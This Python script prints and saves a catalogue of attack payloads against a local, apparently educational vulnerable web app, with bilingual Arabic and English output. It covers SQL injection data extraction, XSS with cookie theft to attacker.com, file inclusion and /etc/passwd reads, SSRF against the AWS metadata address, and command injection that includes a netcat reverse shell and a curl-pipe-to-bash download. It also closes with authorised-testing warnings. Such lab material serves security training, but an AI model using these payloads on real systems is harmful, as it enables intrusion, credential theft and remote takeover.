#!/usr/bin/env python3

"""
قائمة شاملة بالروابط المصابة والحمولات الاستغلالية
Comprehensive list of vulnerable URLs and exploitation payloads
"""

import json
from datetime import datetime

def generate_vulnerable_urls_list():
    """Generate comprehensive list of vulnerable URLs"""
    
    vulnerable_urls = {
        "application_info": {
            "name": "Vulnerable Web Application (Educational)",
            "base_url": "http://127.0.0.1:5000",
            "description": "Educational application with intentional vulnerabilities",
            "generated_date": datetime.now().isoformat()
        },
        
        "vulnerable_endpoints": {
            "sql_injection": {
                "endpoint": "/user",
                "parameter": "id",
                "method": "GET",
                "vulnerability_type": "SQL Injection",
                "severity": "HIGH",
                "description": "Direct SQL query concatenation allows data extraction",
                "basic_payloads": [
                    {
                        "payload": "1' UNION SELECT 1,2,3,4--",
                        "purpose": "Test UNION-based SQL injection",
                        "full_url": "http://127.0.0.1:5000/user?id=1' UNION SELECT 1,2,3,4--"
                    },
                    {
                        "payload": "1' UNION SELECT 1,@@version,3,4--",
                        "purpose": "Extract database version",
                        "full_url": "http://127.0.0.1:5000/user?id=1' UNION SELECT 1,@@version,3,4--"
                    },
                    {
                        "payload": "1' UNION SELECT 1,database(),3,4--",
                        "purpose": "Extract current database name",
                        "full_url": "http://127.0.0.1:5000/user?id=1' UNION SELECT 1,database(),3,4--"
                    },
                    {
                        "payload": "1' UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()--",
                        "purpose": "Extract table names",
                        "full_url": "http://127.0.0.1:5000/user?id=1' UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()--"
                    },
                    {
                        "payload": "1' UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name='users'--",
                        "purpose": "Extract column names from users table",
                        "full_url": "http://127.0.0.1:5000/user?id=1' UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name='users'--"
                    }
                ],
                "advanced_payloads": [
                    {
                        "payload": "1' AND (SELECT COUNT(*) FROM users) > 0--",
                        "purpose": "Blind SQL injection - check if table exists",
                        "full_url": "http://127.0.0.1:5000/user?id=1' AND (SELECT COUNT(*) FROM users) > 0--"
                    },
                    {
                        "payload": "1' AND LENGTH((SELECT password FROM users WHERE id=1)) > 5--",
                        "purpose": "Blind SQL injection - extract data length",
                        "full_url": "http://127.0.0.1:5000/user?id=1' AND LENGTH((SELECT password FROM users WHERE id=1)) > 5--"
                    }
                ]
            },
            
            "xss_vulnerability": {
                "endpoint": "/search",
                "parameter": "q",
                "method": "GET", 
                "vulnerability_type": "Cross-Site Scripting (XSS)",
                "severity": "MEDIUM",
                "description": "Direct HTML output without sanitization",
                "basic_payloads": [
                    {
                        "payload": "<script>alert('XSS')</script>",
                        "purpose": "Basic XSS alert",
                        "full_url": "http://127.0.0.1:5000/search?q=<script>alert('XSS')</script>"
                    },
                    {
                        "payload": "<script>alert(document.cookie)</script>",
                        "purpose": "Steal cookies via XSS",
                        "full_url": "http://127.0.0.1:5000/search?q=<script>alert(document.cookie)</script>"
                    },
                    {
                        "payload": "<img src=x onerror=alert('XSS_PoC')>",
                        "purpose": "Image-based XSS",
                        "full_url": "http://127.0.0.1:5000/search?q=<img src=x onerror=alert('XSS_PoC')>"
                    },
                    {
                        "payload": "<svg onload=alert('PoC_Successful_XSS')>",
                        "purpose": "SVG-based XSS",
                        "full_url": "http://127.0.0.1:5000/search?q=<svg onload=alert('PoC_Successful_XSS')>"
                    }
                ],
                "advanced_payloads": [
                    {
                        "payload": "<script>fetch('http://attacker.com/steal.php?cookie='+document.cookie)</script>",
                        "purpose": "Send cookies to attacker server",
                        "full_url": "http://127.0.0.1:5000/search?q=<script>fetch('http://attacker.com/steal.php?cookie='+document.cookie)</script>"
                    },
                    {
                        "payload": "<script>document.write('<img src=\"http://attacker.com/log.php?data='+document.cookie+'\">')</script>",
                        "purpose": "Steal cookies via image request",
                        "full_url": "http://127.0.0.1:5000/search?q=<script>document.write('<img src=\"http://attacker.com/log.php?data='+document.cookie+'\">')</script>"
                    }
                ]
            },
            
            "lfi_vulnerability": {
                "endpoint": "/include",
                "parameter": "file",
                "method": "GET",
                "vulnerability_type": "Local File Inclusion (LFI)",
                "severity": "HIGH",
                "description": "No path traversal protection allows system file access",
                "basic_payloads": [
                    {
                        "payload": "test.txt",
                        "purpose": "Read test file (legitimate use)",
                        "full_url": "http://127.0.0.1:5000/include?file=test.txt"
                    },
                    {
                        "payload": "../../../../etc/passwd",
                        "purpose": "Read Unix password file",
                        "full_url": "http://127.0.0.1:5000/include?file=../../../../etc/passwd"
                    },
                    {
                        "payload": "../../../../windows/system32/drivers/etc/hosts",
                        "purpose": "Read Windows hosts file",
                        "full_url": "http://127.0.0.1:5000/include?file=../../../../windows/system32/drivers/etc/hosts"
                    }
                ],
                "advanced_payloads": [
                    {
                        "payload": "php://filter/convert.base64-encode/resource=index.php",
                        "purpose": "Read PHP source code in base64",
                        "full_url": "http://127.0.0.1:5000/include?file=php://filter/convert.base64-encode/resource=index.php"
                    },
                    {
                        "payload": "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
                        "purpose": "Execute PHP code via data wrapper",
                        "full_url": "http://127.0.0.1:5000/include?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=="
                    },
                    {
                        "payload": "expect://id",
                        "purpose": "Execute system commands via expect wrapper",
                        "full_url": "http://127.0.0.1:5000/include?file=expect://id"
                    }
                ]
            },
            
            "command_injection": {
                "endpoint": "/execute",
                "parameter": "cmd",
                "method": "GET",
                "vulnerability_type": "Command Injection",
                "severity": "CRITICAL",
                "description": "Direct shell command execution without validation",
                "basic_payloads": [
                    {
                        "payload": "ls",
                        "purpose": "List directory contents",
                        "full_url": "http://127.0.0.1:5000/execute?cmd=ls"
                    },
                    {
                        "payload": "id",
                        "purpose": "Show user ID and groups",
                        "full_url": "http://127.0.0.1:5000/execute?cmd=id"
                    },
                    {
                        "payload": "whoami",
                        "purpose": "Show current user",
                        "full_url": "http://127.0.0.1:5000/execute?cmd=whoami"
                    },
                    {
                        "payload": "pwd",
                        "purpose": "Show current directory",
                        "full_url": "http://127.0.0.1:5000/execute?cmd=pwd"
                    }
                ],
                "advanced_payloads": [
                    {
                        "payload": "ls -la; id; whoami",
                        "purpose": "Execute multiple commands",
                        "full_url": "http://127.0.0.1:5000/execute?cmd=ls -la; id; whoami"
                    },
                    {
                        "payload": "cat /etc/passwd",
                        "purpose": "Read password file",
                        "full_url": "http://127.0.0.1:5000/execute?cmd=cat /etc/passwd"
                    },
                    {
                        "payload": "nc -e /bin/bash attacker.com 4444",
                        "purpose": "Reverse shell (requires attacker listener)",
                        "full_url": "http://127.0.0.1:5000/execute?cmd=nc -e /bin/bash attacker.com 4444"
                    },
                    {
                        "payload": "curl http://attacker.com/shell.sh | bash",
                        "purpose": "Download and execute remote script",
                        "full_url": "http://127.0.0.1:5000/execute?cmd=curl http://attacker.com/shell.sh | bash"
                    }
                ]
            },
            
            "ssrf_vulnerability": {
                "endpoint": "/fetch",
                "parameter": "url",
                "method": "GET",
                "vulnerability_type": "Server-Side Request Forgery (SSRF)",
                "severity": "HIGH",
                "description": "No URL validation allows access to internal resources",
                "basic_payloads": [
                    {
                        "payload": "http://example.com",
                        "purpose": "Fetch external website (legitimate)",
                        "full_url": "http://127.0.0.1:5000/fetch?url=http://example.com"
                    },
                    {
                        "payload": "http://localhost:80",
                        "purpose": "Access local web server",
                        "full_url": "http://127.0.0.1:5000/fetch?url=http://localhost:80"
                    },
                    {
                        "payload": "http://127.0.0.1:80",
                        "purpose": "Access localhost on port 80",
                        "full_url": "http://127.0.0.1:5000/fetch?url=http://127.0.0.1:80"
                    }
                ],
                "advanced_payloads": [
                    {
                        "payload": "http://169.254.169.254/latest/meta-data/",
                        "purpose": "Access AWS metadata service",
                        "full_url": "http://127.0.0.1:5000/fetch?url=http://169.254.169.254/latest/meta-data/"
                    },
                    {
                        "payload": "http://10.0.0.1:80",
                        "purpose": "Access internal network",
                        "full_url": "http://127.0.0.1:5000/fetch?url=http://10.0.0.1:80"
                    },
                    {
                        "payload": "file:///etc/passwd",
                        "purpose": "Read local files via file protocol",
                        "full_url": "http://127.0.0.1:5000/fetch?url=file:///etc/passwd"
                    },
                    {
                        "payload": "ftp://internal-server:21",
                        "purpose": "Access internal FTP server",
                        "full_url": "http://127.0.0.1:5000/fetch?url=ftp://internal-server:21"
                    },
                    {
                        "payload": "http://internal-admin-panel/admin",
                        "purpose": "Access internal admin panel",
                        "full_url": "http://127.0.0.1:5000/fetch?url=http://internal-admin-panel/admin"
                    }
                ]
            },
            
            "header_injection": {
                "endpoint": "/api/headers",
                "parameter": "X-Custom-Header (HTTP Header)",
                "method": "GET",
                "vulnerability_type": "HTTP Header Injection",
                "severity": "MEDIUM",
                "description": "Direct header content in response without validation",
                "basic_payloads": [
                    {
                        "payload": "malicious_header_content",
                        "purpose": "Test header injection",
                        "curl_command": "curl -H 'X-Custom-Header: malicious_header_content' http://127.0.0.1:5000/api/headers"
                    },
                    {
                        "payload": "test\\r\\nNew-Header: injected",
                        "purpose": "Inject new HTTP headers",
                        "curl_command": "curl -H 'X-Custom-Header: test\\r\\nNew-Header: injected' http://127.0.0.1:5000/api/headers"
                    }
                ]
            }
        },
        
        "exploitation_commands": {
            "curl_examples": [
                "curl 'http://127.0.0.1:5000/user?id=1' UNION SELECT 1,@@version,3,4--\"",
                "curl 'http://127.0.0.1:5000/search?q=<script>alert(\"XSS\")</script>'",
                "curl 'http://127.0.0.1:5000/include?file=../../../../etc/passwd'",
                "curl 'http://127.0.0.1:5000/execute?cmd=id;whoami'",
                "curl 'http://127.0.0.1:5000/fetch?url=http://localhost:80'"
            ],
            "python_requests_examples": [
                "import requests; requests.get('http://127.0.0.1:5000/user?id=1\\' UNION SELECT 1,2,3,4--')",
                "import requests; requests.get('http://127.0.0.1:5000/search?q=<script>alert(1)</script>')",
                "import requests; requests.get('http://127.0.0.1:5000/include?file=../../../../etc/passwd')"
            ]
        }
    }
    
    return vulnerable_urls

def print_vulnerable_urls_report():
    """Print comprehensive vulnerable URLs report"""
    
    print("""
╔══════════════════════════════════════════════════════════════════════════════╗
║                    القائمة الشاملة للروابط المصابة                        ║
║                    Comprehensive Vulnerable URLs List                        ║
╚══════════════════════════════════════════════════════════════════════════════╝
    """)
    
    data = generate_vulnerable_urls_list()
    
    print(f"\n[🎯] تطبيق تجريبي عرضة للاختراق:")
    print(f"   • الاسم: {data['application_info']['name']}")
    print(f"   • الرابط الأساسي: {data['application_info']['base_url']}")
    print(f"   • الوصف: {data['application_info']['description']}")
    
    print(f"\n[⚠️] نقاط الضعف المتوفرة:")
    
    for vuln_name, vuln_data in data['vulnerable_endpoints'].items():
        print(f"\n[🔓] {vuln_data['vulnerability_type']}:")
        print(f"   • النقطة الطرفية: {vuln_data['endpoint']}")
        print(f"   • المعلمة: {vuln_data['parameter']}")
        print(f"   • الخطورة: {vuln_data['severity']}")
        print(f"   • الوصف: {vuln_data['description']}")
        
        print(f"\n   [📋] الحمولات الأساسية:")
        for payload in vuln_data['basic_payloads']:
            print(f"      • {payload['purpose']}:")
            if 'full_url' in payload:
                print(f"        الرابط: {payload['full_url']}")
            if 'curl_command' in payload:
                print(f"        الأمر: {payload['curl_command']}")
            print(f"        الحمولة: {payload['payload']}")
            print()
        
        if 'advanced_payloads' in vuln_data:
            print(f"   [🚀] الحمولات المتقدمة:")
            for payload in vuln_data['advanced_payloads']:
                print(f"      • {payload['purpose']}:")
                if 'full_url' in payload:
                    print(f"        الرابط: {payload['full_url']}")
                if 'curl_command' in payload:
                    print(f"        الأمر: {payload['curl_command']}")
                print(f"        الحمولة: {payload['payload']}")
                print()
        
        # Handle payloads without full_url (like header injection)
        if 'basic_payloads' in vuln_data:
            for payload in vuln_data['basic_payloads']:
                if 'full_url' not in payload and 'curl_command' in payload:
                    print(f"      • {payload['purpose']}:")
                    print(f"        الأمر: {payload['curl_command']}")
                    print(f"        الحمولة: {payload['payload']}")
                    print()
    
    print("="*80)
    print("[⚠️] تحذيرات مهمة:")
    print("="*80)
    print("• هذه الروابط مخصصة للتعليم والاختبار المصرح به فقط")
    print("• لا تحاول استخدامها على أنظمة لا تملكها أو ليس لديك تصريح باختبارها")
    print("• دائماً احصل على إذن كتابي قبل إجراء أي اختبار اختراق")
    print("• اتبع ممارسات الإفصاح المسؤول عند اكتشاف ثغرات")
    print("• الاستخدام غير المصرح به قد يعرضك للمسؤولية القانونية")
    print("="*80)

def save_urls_to_file():
    """Save vulnerable URLs to JSON file"""
    data = generate_vulnerable_urls_list()
    
    with open('vulnerable_urls_complete.json', 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=2)
    
    print(f"\n[✅] تم حفظ القائمة الكاملة في ملف: vulnerable_urls_complete.json")

def main():
    print_vulnerable_urls_report()
    save_urls_to_file()
    
    print("\n[🎉] تم إنشاء القائمة الشاملة للروابط المصابة بنجاح!")
    print("[📄] يمكنك الآن استخدام هذه الروابط لاختبار الأدوات التي أنشأناها")
    print("[🔧] جرب تشغيل: python poc_exploiter.py http://127.0.0.1:5000")
    print("[🚀] أو ابدأ التطبيق العرضة: python vulnerable_app.py")

if __name__ == "__main__":
    main()